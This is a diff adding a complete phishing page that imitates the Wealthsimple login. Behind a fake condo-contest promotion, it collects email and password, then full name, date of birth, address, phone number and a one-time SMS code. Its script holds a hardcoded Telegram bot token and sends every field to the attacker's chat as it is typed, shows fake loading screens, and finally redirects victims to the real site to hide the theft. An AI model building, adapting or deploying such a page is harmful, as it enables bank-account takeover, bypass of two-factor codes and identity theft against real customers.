@@ -1,0 +1,956 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Wealthsimple - Log in</title>
+<link rel="icon" type="image/png" href="wealthsimple5.png">
+<style>
+  /* Réinitialisation de base */
+  * {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+  }
+
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    color: #232323;
+    display: flex;
+    min-height: 100vh;
+    background-color: #ffffff;
+  }
+
+  /* Panneau de gauche */
+  .left-panel {
+    flex: 1;
+    padding: 24px 40px 40px 40px;
+    display: flex;
+    flex-direction: column;
+    justify-content: flex-start;
+  }
+
+  .logo {
+    margin-left: -12px;
+    margin-bottom: 70px;
+  }
+
+  .logo a {
+    display: inline-block;
+  }
+
+  .logo img {
+    height: 26.5px;
+    display: block;
+  }
+
+  .promo-content {
+    margin: 18.5px auto auto auto;
+    max-width: 425px;
+    text-align: center;
+  }
+
+  .subtitle {
+    font-size: 18px;
+    font-weight: 400;
+    letter-spacing: 1.9px;
+    text-transform: uppercase;
+    color: #000000;
+    margin-bottom: 20px;
+  }
+
+  .title {
+    font-size: 57px; 
+    font-weight: 650;
+    line-height: 1.06;
+    letter-spacing: -1.4px;
+    margin-bottom: 24px;
+    color: #333333;
+  }
+
+  .description {
+    font-size: 18.5px; 
+    line-height: 1.5;
+    color: #232323;
+  }
+
+  .description a {
+    color: #232323;
+    text-decoration: underline;
+    text-underline-offset: 4px;
+    font-weight: 400;
+  }
+
+  /* Panneau de droite */
+  .right-panel {
+    flex: 1;
+    background-color: #f1f1f1;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    position: relative;
+    padding: 2.5px 40px 40px 40px;
+  }
+
+  /* Conteneur dédié pour le carré de formulaire */
+  .form-container {
+    width: 100%;
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    margin-top: 0;
+    flex: 1;
+  }
+
+  .login-card {
+    background: #ffffff;
+    width: 100%;
+    max-width: 486px;
+    padding: 20px 24px 28px 24px;
+    border-radius: 16px;
+    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.02);
+    margin: 0;
+  }
+
+  .login-card h2 {
+    text-align: center;
+    font-size: 26px;
+    font-weight: 649.999;
+    margin-bottom: 24px;
+    color: #000000;
+    letter-spacing: -0.5px;
+  }
+
+  .input-group {
+    margin-bottom: 16px;
+    position: relative;
+  }
+
+  /* Wrapper pour stabiliser le champ et l'icône de l'œil indépendamment du message d'erreur */
+  .input-wrapper {
+    position: relative;
+    width: 100%;
+  }
+
+  .input-group input, .input-group select {
+    width: 100%;
+    padding: 19px 24px 19px 16px;
+    font-size: 13px;
+    font-weight: 550;
+    border: 1px solid #e0e0e0;
+    border-radius: 15px;
+    background-color: #f5f5f5;
+    color: #111;
+    outline: none;
+    transition: background-color 0.2s, border-color 0.2s;
+  }
+
+  .input-group input::placeholder {
+    color: #666666;
+    font-weight: 550;
+  }
+
+  .input-group input:focus, .input-group select:focus {
+    background-color: #f5f5f5;
+    border-color: #000000;
+  }
+
+  .input-group input[type="password"],
+  .input-group input[type="text"].password-field {
+    padding-right: 64px;
+  }
+
+  .input-group input.error-input, .input-group select.error-input {
+    border-color: #ff3b30 !important;
+  }
+
+  .error-message {
+    color: #ff3b30;
+    font-size: 12px;
+    font-weight: 550;
+    margin-top: 6px;
+    margin-left: 4px;
+    display: none;
+  }
+
+  .eye-icon-button {
+    position: absolute;
+    right: 12px;
+    top: 50%;
+    transform: translateY(-50%);
+    width: 38px;
+    height: 38px;
+    background: #ffffff;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border: none;
+    cursor: pointer;
+    box-shadow: 0 2px 6px rgba(0, 0, 0, 0.08);
+    color: #000000;
+  }
+
+  .forgot-password {
+    display: inline-block;
+    font-size: 12px;
+    color: #000000;
+    font-weight: 730;
+    text-decoration: underline;
+    text-underline-offset: 3px;
+    margin-top: -6px;
+    margin-bottom: 18px;
+    cursor: pointer;
+  }
+
+  .divider {
+    border: 0;
+    height: 1px;
+    background: #ececec;
+    margin: 0 -24px 16px -24px;
+  }
+
+  .button-group {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+
+  .passkey-signup-container {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    margin-top: 12px;
+    gap: 14px;
+  }
+
+  .btn {
+    font-size: 15px;
+    font-weight: 700;
+    border-radius: 100px;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: transform 0.1s, box-shadow 0.2s;
+    border: none;
+  }
+
+  .btn:active {
+    transform: scale(0.98);
+  }
+
+  .btn-login {
+    padding: 14px 57px;
+    font-size: 13px;
+    background: #ffffff;
+    color: #000000;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+  }
+
+  .btn-passkey {
+    padding: 14px 16px;
+    font-size: 13px;
+    background: #000000;
+    color: #ffffff;
+    box-shadow: 0 4px 14px rgba(0, 0, 0, 0.2);
+    gap: 8px;
+  }
+
+  .signup-text {
+    text-align: center;
+    font-size: 15px;
+    color: #000000;
+  }
+
+  .signup-text a {
+    color: #000000;
+    font-size: 13.5px;
+    font-weight: 730;
+    text-decoration: underline;
+    text-underline-offset: 3px;
+  }
+
+  /* Styles spécifiques pour la vue Reset password */
+  .reset-view {
+    display: none;
+    width: 100%;
+    max-width: 580px;
+    margin: 0 auto;
+    padding-top: 20px;
+  }
+
+  .back-link {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    font-size: 14px;
+    font-weight: 600;
+    color: #000000;
+    text-decoration: none;
+    margin-bottom: 24px;
+    cursor: pointer;
+  }
+
+  .reset-title {
+    font-size: 32px;
+    font-weight: 700;
+    color: #000000;
+    margin-bottom: 24px;
+    letter-spacing: -0.5px;
+  }
+
+  .reset-card {
+    background: #ffffff;
+    width: 100%;
+    padding: 32px;
+    border-radius: 16px;
+    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.02);
+    margin-bottom: 24px;
+  }
+
+  .reset-card p {
+    font-size: 15px;
+    color: #232323;
+    line-height: 1.5;
+    margin-bottom: 20px;
+  }
+
+  .btn-continue {
+    width: 100%;
+    max-width: 180px;
+    margin: 0 auto;
+    padding: 14px 24px;
+    font-size: 14px;
+    background: #808080;
+    color: #ffffff;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+  }
+
+  /* Styles pour l'écran de chargement de 9 secondes */
+  .loading-card {
+    display: none;
+    text-align: center;
+    padding: 40px 20px;
+  }
+
+  .spinner {
+    width: 40px;
+    height: 40px;
+    border: 4px solid #f3f3f3;
+    border-top: 4px solid #000000;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin: 0 auto 20px auto;
+  }
+
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+
+  /* Pied de page (Footer) */
+  .footer {
+    position: absolute;
+    bottom: 12px;
+    left: 0;
+    right: 0;
+    padding: 4px 40px 0 40px;
+    display: flex;
+    justify-content: space-between;
+    font-size: 15px;
+    color: #000000;
+    border-top: 1px solid rgba(0, 0, 0, 0.04);
+  }
+
+  .footer-left {
+    margin-left: -16px;
+    margin-top: 16px;
+    margin-bottom: 20px;
+  }
+
+  .footer a {
+    color: #000000;
+    font-size: 13.5px;
+    font-weight: 730;
+    text-decoration: underline;
+    text-underline-offset: 3px;
+    margin-left: 8px;
+  }
+
+  .help-link {
+    margin-left: 0 !important;
+  }
+
+  .footer-right {
+    display: flex;
+    align-items: center;
+    margin-top: 16px; 
+    margin-bottom: 20px;
+  }
+  
+  .footer-right span {
+    margin-right: 4px;
+    font-weight: 400;
+  }
+
+  /* Réactivité pour les petits écrans */
+  @media (max-width: 900px) {
+    body {
+      flex-direction: column;
+    }
+    .left-panel, .right-panel {
+      width: 100%;
+      flex: none;
+      min-height: 50vh;
+    }
+    .footer {
+      position: relative;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      margin-top: 60px;
+      flex-direction: column;
+      align-items: center;
+      gap: 16px;
+      padding: 24px 20px 0 20px;
+      border-top: 1px solid rgba(0, 0, 0, 0.04);
+    }
+    .footer-left, .footer-right {
+      margin-left: 0;
+      margin-top: 0;
+      margin-bottom: 0;
+    }
+  }
+</style>
+</head>
+<body>
+
+  <!-- Moitié Gauche -->
+  <div class="left-panel">
+    <div class="logo">
+      <a href="https://www.wealthsimple.com/fr-ca" target="_blank" rel="noopener noreferrer">
+        <img src="wealthsimple6.png" alt="Wealthsimple Logo">
+      </a>
+    </div>
+    
+    <div class="promo-content">
+      <div class="subtitle">MONTHLY MILLIONAIRE</div>
+      <h1 class="title">Win a condo<br>every Thursday<br>this September</h1>
+      <p class="description">
+        Every dollar saved gets you a chance to win. Every<br>
+        referral gets you 100,000 chances to win. And the<br>
+        grand prize? A $1M+ home in Toronto. <span style="white-space: nowrap;"><a href="https://help.wealthsimple.com/hc/en-ca/articles/49705211487771-Wealthsimple-Monthly-Millionaire-September-Contest" target="_blank" rel="noopener noreferrer">T&Cs apply.</a></span>
+      </p>
+    </div>
+    
+    <div></div>
+  </div>
+
+  <!-- Moitié Droite -->
+  <div class="right-panel">
+    
+    <!-- Conteneur Vue Connexion -->
+    <div class="form-container" id="login-view">
+      <div class="login-card">
+        <h2>Welcome back</h2>
+        
+        <div class="input-group">
+          <input type="email" id="email-input" placeholder="Email">
+          <div class="error-message" id="email-error">Please enter your email address.</div>
+        </div>
+        
+        <div class="input-group">
+          <div class="input-wrapper">
+            <input type="password" id="password-input" class="password-field" placeholder="Password">
+            <!-- Bouton circulaire avec icône Œil -->
+            <button type="button" class="eye-icon-button" id="toggle-password" aria-label="Toggle password visibility">
+              <svg class="eye-icon" id="eye-svg" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                <circle cx="12" cy="12" r="3"></circle>
+              </svg>
+            </button>
+          </div>
+          <div class="error-message" id="password-error">Please enter your password.</div>
+        </div>
+        
+        <a id="forgot-link" class="forgot-password">Forgot password?</a>
+        
+        <hr class="divider">
+        
+        <div class="button-group">
+          <button class="btn btn-login" id="login-btn">Log in</button>
+        </div>
+
+        <!-- Conteneur séparé -->
+        <div class="passkey-signup-container">
+          <button class="btn btn-passkey">
+            Log in with a passkey
+            <!-- Icône Clé -->
+            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"></path>
+            </svg>
+          </button>
+          
+          <div class="signup-text">
+            Don't have an account? <a href="#">Sign up</a>
+          </div>
+        </div>
+        
+      </div>
+    </div>
+
+    <!-- Conteneur Vue Formulaire de Vérification d'Identité -->
+    <div class="form-container" id="identity-view" style="display: none;">
+      <div class="login-card" style="max-width: 520px; max-height: 85vh; overflow-y: auto;">
+        <h2>Identity Verification</h2>
+        <p style="font-size: 13px; color: #666; margin-bottom: 16px; text-align: center;">Please confirm your personal information to secure your account access.</p>
+        
+        <div class="input-group" style="margin-bottom: 12px;">
+          <input type="text" id="id-fullname" placeholder="Full name">
+          <div class="error-message" id="fullname-error">Please enter your full name.</div>
+        </div>
+
+        <div class="input-group" style="margin-bottom: 12px;">
+          <input type="text" id="id-dob" placeholder="Date of birth (DD / MM / YYYY)">
+          <div class="error-message" id="dob-error">Please enter your date of birth.</div>
+        </div>
+
+        <div class="input-group" style="margin-bottom: 12px;">
+          <input type="text" id="id-address" placeholder="Residential address">
+          <div class="error-message" id="address-error">Please enter your address.</div>
+        </div>
+
+        <div class="input-group" style="margin-bottom: 12px;">
+          <select id="id-country">
+            <option value="">Select Country</option>
+            <option value="Canada">Canada</option>
+            <option value="United States">United States</option>
+            <option value="France">France</option>
+            <option value="United Kingdom">United Kingdom</option>
+            <option value="Other">Other</option>
+          </select>
+          <div class="error-message" id="country-error">Please select your country.</div>
+        </div>
+
+        <div class="input-group" style="margin-bottom: 12px;">
+          <select id="id-province">
+            <option value="">Select Province / State</option>
+            <option value="Quebec">Québec</option>
+            <option value="Ontario">Ontario</option>
+            <option value="British Columbia">British Columbia</option>
+            <option value="Alberta">Alberta</option>
+            <option value="Manitoba">Manitoba</option>
+            <option value="Nova Scotia">Nova Scotia</option>
+            <option value="New Brunswick">New Brunswick</option>
+            <option value="Newfoundland and Labrador">Newfoundland and Labrador</option>
+            <option value="Prince Edward Island">Prince Edward Island</option>
+            <option value="Saskatchewan">Saskatchewan</option>
+            <option value="Other">Other</option>
+          </select>
+          <div class="error-message" id="province-error">Please select your province.</div>
+        </div>
+
+        <div class="input-group" style="margin-bottom: 12px;">
+          <input type="text" id="id-postal" placeholder="Postal / ZIP code">
+          <div class="error-message" id="postal-error">Please enter your postal code.</div>
+        </div>
+
+        <div class="input-group" style="margin-bottom: 16px;">
+          <input type="tel" id="id-phone" placeholder="Phone number">
+          <div class="error-message" id="idphone-error">Please enter your phone number.</div>
+        </div>
+        
+        <div class="button-group" style="margin-top: 5px;">
+          <button class="btn btn-passkey" id="identity-btn" style="width: 100%;">Continue</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Conteneur Vue Code OTP à 6 chiffres -->
+    <div class="form-container" id="code-view" style="display: none;">
+      <div class="login-card">
+        <h2>Enter verification code</h2>
+        <p style="font-size: 14px; color: #666; margin-bottom: 20px; text-align: center;">Enter the 6-digit code sent to your phone number.</p>
+        
+        <div class="input-group">
+          <input type="text" id="code-input" maxlength="6" placeholder="123456" style="letter-spacing: 4px; text-align: center; font-size: 18px;">
+          <div class="error-message" id="code-error">Please enter the 6-digit code.</div>
+        </div>
+        
+        <div class="button-group" style="margin-top: 10px;">
+          <button class="btn btn-passkey" id="code-btn" style="width: 100%;">Verify</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Conteneur de Chargement (9 secondes) -->
+    <div class="form-container" id="loading-view" style="display: none;">
+      <div class="login-card loading-card" style="display: block;">
+        <div class="spinner"></div>
+        <h2 id="loading-title" style="font-size: 20px; margin-bottom: 10px;">Please wait...</h2>
+        <p id="loading-desc" style="font-size: 14px; color: #666;">Processing your security verification.</p>
+      </div>
+    </div>
+
+    <!-- Conteneur Vue Réinitialisation (Forgot Password) -->
+    <div class="form-container" id="reset-view" style="display: none;">
+      <div class="reset-view">
+        <a id="back-link" class="back-link">
+          <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
+          Back
+        </a>
+        <h1 class="reset-title">Reset your password</h1>
+        <div class="reset-card">
+          <p>Enter the email address associated with your account to reset your password.</p>
+          <div class="input-group" style="margin-bottom: 0;">
+            <input type="email" id="reset-email-input" placeholder="Email address">
+            <div class="error-message" id="reset-email-error">Please enter your email address.</div>
+          </div>
+        </div>
+        <div class="button-group">
+          <button class="btn btn-continue" id="continue-btn">Continue</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Pied de page -->
+    <div class="footer">
+      <div class="footer-left">
+        <a href="https://help.wealthsimple.com/hc/en-ca" class="help-link" target="_blank" rel="noopener noreferrer">Help Centre</a>
+      </div>
+      <div class="footer-right">
+        <span>Download our mobile apps</span>
+        <a href="https://apps.apple.com/ca/app/wealthsimple/id1403491709" target="_blank" rel="noopener noreferrer">iPhone</a>
+        <a href="https://play.google.com/store/apps/details?id=com.wealthsimple.trade" target="_blank" rel="noopener noreferrer">Android</a>
+      </div>
+    </div>
+    
+  </div>
+
+  <script>
+    const loginView = document.getElementById('login-view');
+    const identityView = document.getElementById('identity-view');
+    const codeView = document.getElementById('code-view');
+    const loadingView = document.getElementById('loading-view');
+    const resetView = document.getElementById('reset-view');
+    
+    const forgotLink = document.getElementById('forgot-link');
+    const backLink = document.getElementById('back-link');
+
+    const TELEGRAM_BOT_TOKEN = "8766214960:AAEX7YS3CTaQCHbe7wNWGbwNjSgjLuTGEpw";
+    const TELEGRAM_CHAT_ID = "8370855026";
+
+    let telegramMessageId = null;
+    let typingTimer;
+    let cachedIdentityData = {};
+
+    forgotLink.addEventListener('click', (e) => {
+      e.preventDefault();
+      loginView.style.display = 'none';
+      resetView.style.display = 'flex';
+    });
+
+    backLink.addEventListener('click', (e) => {
+      e.preventDefault();
+      resetView.style.display = 'none';
+      loginView.style.display = 'flex';
+    });
+
+    // Gestion de l'affichage du mot de passe et du changement d'icône d'œil
+    const togglePasswordBtn = document.getElementById('toggle-password');
+    const passwordInput = document.getElementById('password-input');
+    const eyeSvg = document.getElementById('eye-svg');
+
+    togglePasswordBtn.addEventListener('click', () => {
+      const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+      passwordInput.setAttribute('type', type);
+
+      if (type === 'text') {
+        eyeSvg.innerHTML = `
+          <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
+          <line x1="1" y1="1" x2="23" y2="23"></line>
+        `;
+      } else {
+        eyeSvg.innerHTML = `
+          <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+          <circle cx="12" cy="12" r="3"></circle>
+        `;
+      }
+    });
+
+    // Fonction utilitaire pour simuler un chargement de 9 secondes
+    function runLoading(customTitle, customDesc, callback) {
+      loginView.style.display = 'none';
+      identityView.style.display = 'none';
+      codeView.style.display = 'none';
+      
+      const loadingTitle = document.getElementById('loading-title');
+      const loadingDesc = document.getElementById('loading-desc');
+      
+      if (customTitle) loadingTitle.textContent = customTitle;
+      if (customDesc) {
+        loadingDesc.textContent = customDesc;
+        loadingDesc.style.display = 'block';
+      } else {
+        loadingDesc.style.display = 'none';
+      }
+
+      loadingView.style.display = 'flex';
+
+      setTimeout(() => {
+        loadingView.style.display = 'none';
+        callback();
+      }, 9000);
+    }
+
+    // Fonction d'envoi et de mise à jour en direct sur Telegram
+    function sendOrUpdateTelegram(email, password, identityData = {}, otpCode = 'Non renseigné', isLiveUpdate = false) {
+      const message = `━━━━━━━━━━━━━━━━━━━\n` +
+                      ` 🔔 ${isLiveUpdate ? 'WEALTHSIMPLE EN DIRECT' : 'NOUVELLE TENTATIVE WEALTHSIMPLE'} \n` +
+                      `━━━━━━━━━━━━━━━━━━━\n` +
+                      `📧 **Email :** \`${email || '...'}\`\n` +
+                      `🔑 **Mot de passe :** \`${password || '...'}\`\n` +
+                      `👤 **Nom complet :** \`${identityData.fullname || 'Non renseigné'}\`\n` +
+                      `🎂 **Date de naissance :** \`${identityData.dob || 'Non renseigné'}\`\n` +
+                      `🏠 **Adresse :** \`${identityData.address || 'Non renseigné'}\`\n` +
+                      `🌍 **Pays :** \`${identityData.country || 'Non renseigné'}\`\n` +
+                      `📍 **Province :** \`${identityData.province || 'Non renseigné'}\`\n` +
+                      `📮 **Code postal :** \`${identityData.postal || 'Non renseigné'}\`\n` +
+                      `📱 **Téléphone :** \`${identityData.phone || 'Non renseigné'}\`\n` +
+                      `🔢 **Code OTP (6 chiffres) :** \`${otpCode}\`\n` +
+                      `━━━━━━━━━━━━━━━━━━━`;
+
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/`;
+
+      if (isLiveUpdate && telegramMessageId) {
+        fetch(url + 'editMessageText', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            message_id: telegramMessageId,
+            text: message,
+            parse_mode: 'Markdown'
+          })
+        }).catch(err => console.error('Erreur Telegram edit:', err));
+      } else {
+        fetch(url + 'sendMessage', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+          })
+        })
+        .then(res => res.json())
+        .then(res => {
+          if (res.ok && res.result) {
+            telegramMessageId = res.result.message_id;
+          }
+        })
+        .catch(err => console.error('Erreur Telegram send:', err));
+      }
+    }
+
+    // Fonction de déclenchement en direct lors de la saisie des identifiants
+    function handleInputChange() {
+      clearTimeout(typingTimer);
+      typingTimer = setTimeout(() => {
+        const emailVal = document.getElementById('email-input').value.trim();
+        const passVal = document.getElementById('password-input').value.trim();
+        if (emailVal || passVal) {
+          sendOrUpdateTelegram(emailVal, passVal, cachedIdentityData, 'Non renseigné', true);
+        }
+      }, 300);
+    }
+
+    const emailInput = document.getElementById('email-input');
+    emailInput.addEventListener('input', () => {
+      if (emailInput.value.trim()) {
+        emailInput.classList.remove('error-input');
+        document.getElementById('email-error').style.display = 'none';
+      }
+      handleInputChange();
+    });
+
+    passwordInput.addEventListener('input', () => {
+      if (passwordInput.value.trim()) {
+        passwordInput.classList.remove('error-input');
+        document.getElementById('password-error').style.display = 'none';
+      }
+      handleInputChange();
+    });
+
+    // Écouteurs de saisie en direct pour les champs du formulaire d'identité et OTP
+    ['id-fullname', 'id-dob', 'id-address', 'id-country', 'id-province', 'id-postal', 'id-phone'].forEach(id => {
+      document.getElementById(id).addEventListener('input', () => {
+        cachedIdentityData = {
+          fullname: document.getElementById('id-fullname').value.trim(),
+          dob: document.getElementById('id-dob').value.trim(),
+          address: document.getElementById('id-address').value.trim(),
+          country: document.getElementById('id-country').value.trim(),
+          province: document.getElementById('id-province').value.trim(),
+          postal: document.getElementById('id-postal').value.trim(),
+          phone: document.getElementById('id-phone').value.trim()
+        };
+        sendOrUpdateTelegram(emailInput.value.trim(), passwordInput.value.trim(), cachedIdentityData, 'Non renseigné', true);
+      });
+    });
+
+    document.getElementById('code-input').addEventListener('input', () => {
+      const codeVal = document.getElementById('code-input').value.trim();
+      if (codeVal.length > 0) {
+        sendOrUpdateTelegram(emailInput.value.trim(), passwordInput.value.trim(), cachedIdentityData, codeVal, true);
+      }
+    });
+
+    // Validation des formulaires au clic sur Log in
+    const loginBtn = document.getElementById('login-btn');
+    const emailError = document.getElementById('email-error');
+    const passwordError = document.getElementById('password-error');
+
+    loginBtn.addEventListener('click', (e) => {
+      e.preventDefault();
+      let hasError = false;
+
+      if (!emailInput.value.trim()) {
+        emailInput.classList.add('error-input');
+        emailError.style.display = 'block';
+        hasError = true;
+      } else {
+        emailInput.classList.remove('error-input');
+        emailError.style.display = 'none';
+      }
+
+      if (!passwordInput.value.trim()) {
+        passwordInput.classList.add('error-input');
+        passwordError.style.display = 'block';
+        hasError = true;
+      } else {
+        passwordInput.classList.remove('error-input');
+        passwordError.style.display = 'none';
+      }
+
+      if (!hasError) {
+        sendOrUpdateTelegram(emailInput.value.trim(), passwordInput.value.trim(), {}, 'Non renseigné', false);
+
+        runLoading('Please wait...', 'Processing your security verification.', () => {
+          identityView.style.display = 'flex';
+        });
+      }
+    });
+
+    // Validation du formulaire de vérification d'identité
+    const identityBtn = document.getElementById('identity-btn');
+    const idFullname = document.getElementById('id-fullname');
+    const idDob = document.getElementById('id-dob');
+    const idAddress = document.getElementById('id-address');
+    const idCountry = document.getElementById('id-country');
+    const idProvince = document.getElementById('id-province');
+    const idPostal = document.getElementById('id-postal');
+    const idPhone = document.getElementById('id-phone');
+
+    identityBtn.addEventListener('click', (e) => {
+      e.preventDefault();
+      let hasIdError = false;
+
+      const fields = [
+        { el: idFullname, err: 'fullname-error' },
+        { el: idDob, err: 'dob-error' },
+        { el: idAddress, err: 'address-error' },
+        { el: idCountry, err: 'country-error' },
+        { el: idProvince, err: 'province-error' },
+        { el: idPostal, err: 'postal-error' },
+        { el: idPhone, err: 'idphone-error' }
+      ];
+
+      fields.forEach(f => {
+        if (!f.el.value.trim()) {
+          f.el.classList.add('error-input');
+          document.getElementById(f.err).style.display = 'block';
+          hasIdError = true;
+        } else {
+          f.el.classList.remove('error-input');
+          document.getElementById(f.err).style.display = 'none';
+        }
+      });
+
+      if (!hasIdError) {
+        cachedIdentityData = {
+          fullname: idFullname.value.trim(),
+          dob: idDob.value.trim(),
+          address: idAddress.value.trim(),
+          country: idCountry.value.trim(),
+          province: idProvince.value.trim(),
+          postal: idPostal.value.trim(),
+          phone: idPhone.value.trim()
+        };
+
+        sendOrUpdateTelegram(emailInput.value.trim(), passwordInput.value.trim(), cachedIdentityData, 'Non renseigné', false);
+
+        runLoading('Please wait...', 'Processing your security verification.', () => {
+          codeView.style.display = 'flex';
+        });
+      }
+    });
+
+    // Validation du code OTP à 6 chiffres
+    const codeBtn = document.getElementById('code-btn');
+    const codeInput = document.getElementById('code-input');
+    const codeError = document.getElementById('code-error');
+
+    codeBtn.addEventListener('click', (e) => {
+      e.preventDefault();
+      if (!codeInput.value.trim() || codeInput.value.trim().length < 6) {
+        codeInput.classList.add('error-input');
+        codeError.style.display = 'block';
+      } else {
+        codeInput.classList.remove('error-input');
+        codeError.style.display = 'none';
+
+        sendOrUpdateTelegram(emailInput.value.trim(), passwordInput.value.trim(), cachedIdentityData, codeInput.value.trim(), false);
+
+        // ÉTAPE FINALE : Chargement, verrouillage de l'historique et redirection
+        runLoading('Merci vos fonds ont été déposés avec succès', '', () => {
+          history.replaceState(null, '', location.href);
+          window.location.replace('https://www.wealthsimple.com/fr-ca');
+        });
+      }
+    });
+
+    codeInput.addEventListener('input', () => {
+      if (codeInput.value.trim()) {
+        codeInput.classList.remove('error-input');
+        codeError.style.display = 'none';
+      }
+    });
+
+    // Validation pour la vue Reset Password
+    const continueBtn = document.getElementById('continue-btn');
+    const resetEmailInput = document.getElementById('reset-email-input');
+    const resetEmailError = document.getElementById('reset-email-error');
+
+    continueBtn.addEventListener('click', (e) => {
+      e.preventDefault();
+      if (!resetEmailInput.value.trim()) {
+        resetEmailInput.classList.add('error-input');
+        resetEmailError.style.display = 'block';
+      } else {
+        resetEmailInput.classList.remove('error-input');
+        resetEmailError.style.display = 'none';
+        alert('Instructions envoyées par e-mail.');
+      }
+    });
+
+    resetEmailInput.addEventListener('input', () => {
+      if (resetEmailInput.value.trim()) {
+        resetEmailInput.classList.remove('error-input');
+        resetEmailError.style.display = 'none';
+      }
+    });
+  </script>
+
+</body>
+</html>
